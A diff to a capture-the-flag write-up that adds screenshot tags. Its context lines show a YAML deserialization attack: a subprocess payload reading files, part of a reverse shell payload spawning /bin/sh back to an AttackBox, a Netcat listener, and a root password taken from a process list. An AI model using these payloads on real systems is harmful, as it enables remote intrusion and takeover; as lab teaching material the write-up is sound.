@@ -59,6 +59,10 @@ The application hung for exactly 5 seconds, confirming Remote Code Execution (RC
 name: !!python/object/apply:subprocess.check_output [["ls", "-la", "/home/bartender"]]
 ```
 
+<p align="center">
+  <img src="images/python-works.png" alt="Payload enumerating and reading files via the UI" width="800">
+</p>
+
 **Getting a Reverse Shell:** While reading files via the UI worked, getting an interactive shell is much better. I researched YAML reverse shell payloads and found the appropriate syntax:
 
 ```yaml
@@ -75,7 +79,15 @@ payload: !!python/object/apply:subprocess.Popen
       p=subprocess.call(["/bin/sh","-i"]);
 ```
 
+<p align="center">
+  <img src="images/yaml-payload.png" alt="YAML Reverse Shell Payload Reference" width="800">
+</p>
+
 **Catching the Connection:** I set up a Netcat listener on my AttackBox (`nc -nvlp 1234`), modified the YAML file with the reverse shell payload containing my AttackBox IP, and uploaded it. The server connected back, granting me a shell as the `bartender` user!
+
+<p align="center">
+  <img src="images/remote-access-terminal.png" alt="Uploading the reverse shell payload and catching the connection" width="800">
+</p>
 
 ---
 
@@ -92,6 +104,10 @@ ps aux | grep jukebox
 **Extracting the Password:** The process list revealed that the root user was running the script with the password passed directly in the command line argument (`--stream-pass SunsetSpritz2024!`).
 
 **Root Shell:** I simply used the `su root` command, pasted the discovered password, and successfully escalated my privileges to root. From there, I navigated to `/root` and read the final flag.
+
+<p align="center">
+  <img src="images/password-and-flag.png" alt="Escalating privileges to root and capturing the final flag" width="800">
+</p>
 
 ---
 
